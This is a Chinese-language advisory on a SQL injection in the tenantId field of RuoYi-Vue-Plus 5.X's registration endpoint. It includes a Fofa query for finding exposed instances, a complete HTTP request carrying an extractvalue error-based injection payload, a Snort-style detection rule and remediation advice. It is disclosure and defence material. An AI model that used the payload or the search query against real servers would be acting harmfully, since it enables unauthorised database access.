# RuoYi-Vue-Plus-5.X tenant_id SQL注入漏洞

RuoYi-Vue-Plus-5.X tenant_id SQL注入漏洞

# 影响版本

RuoYi-Vue-Plus 5.X 系列版本

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa: body=&quot;RuoYi-Vue-Plus后台管理框架&quot;**

**POC/EXP：**

**step1 extractvalue报错注入**

```
POST /auth/register HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Connection: keep-alive
Content-Type: application/json

{ 
  "clientId": "e5cd7e4891bf95d1d19206ce24a7b32e",
  "grantType": "password",
  "tenantId": "x' AND extractvalue(1,concat(0x7e,(SELECT version()))) AND '1'='1",
  "username": "test",
  "password": "test123"
}
```

​![image](assets/image-20260823180751-5xvqg1m.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"RuoYi-Vue-Plus 5.X - tenant_id SQL注入漏洞 (报错注入 extractvalue)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/auth/register"; fast_pattern;
    http.content_type; content:"application/json";
    http.request_body; content:"\"tenantId\""; nocase;
    http.request_body; pcre:"/\"tenantId\"\s*:\s*\"[^\"]*?(?:extractvalue|updatexml)\s*\(/i";
    metadata:
        service http,
        affected_product "RuoYi-Vue-Plus 5.X",
        vulnerability_type "SQL Injection (Error-based)",
        severity "critical";
    classtype:web-application-attack;
    sid:1000732;
    rev:1;
    priority:1;
)
```

# 漏洞修复

* **首选方案：升级版本**  
  最直接、彻底的修复方式是**升级到官方已修复的版本**。建议升级到**更新的稳定版本**。
* **临时加固措施（如无法立即升级）**

  1. **部署WAF规则**：在Web应用防火墙（WAF）上配置规则，拦截包含明显SQL注入特征的请求。
  2. **网络访问控制**：通过防火墙限制后台管理系统仅能从内网或特定可信IP访问，避免直接暴露在公网。
  3. **代码自查**：根据官方修复方案，审查代码中所有涉及多租户SQL拼接的逻辑，确保在拼接前对参数进行了有效过滤或清理。

‍
